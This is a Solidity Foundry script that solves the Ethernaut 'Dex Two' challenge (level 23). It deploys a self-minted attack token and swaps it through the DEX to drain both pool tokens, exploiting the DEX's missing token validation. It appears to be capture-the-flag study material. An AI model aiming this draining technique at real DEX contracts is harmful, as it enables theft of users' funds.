// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackToken} from "src/Level23.sol";

// ================================================================
// │                        LEVEL 23 - DEX TWO                    │
// ================================================================
interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IDex dex = IDex(targetContractAddress);

        uint256 initialAtkSupply = 400;

        vm.startBroadcast();
        // Deploy AttackToken ATK
        AttackToken atk = new AttackToken(initialAtkSupply);

        // Transfer 100 ATK to DEX
        atk.transfer(targetContractAddress, 100);

        // Get token addresses
        address token1 = dex.token1();
        address token2 = dex.token2();

        // Approve DEX to spend ATK
        atk.approve(targetContractAddress, initialAtkSupply);

        // Swap tokens
        dex.swap(address(atk), token1, 100);
        dex.swap(address(atk), token2, 200);

        vm.stopBroadcast();
    }
}
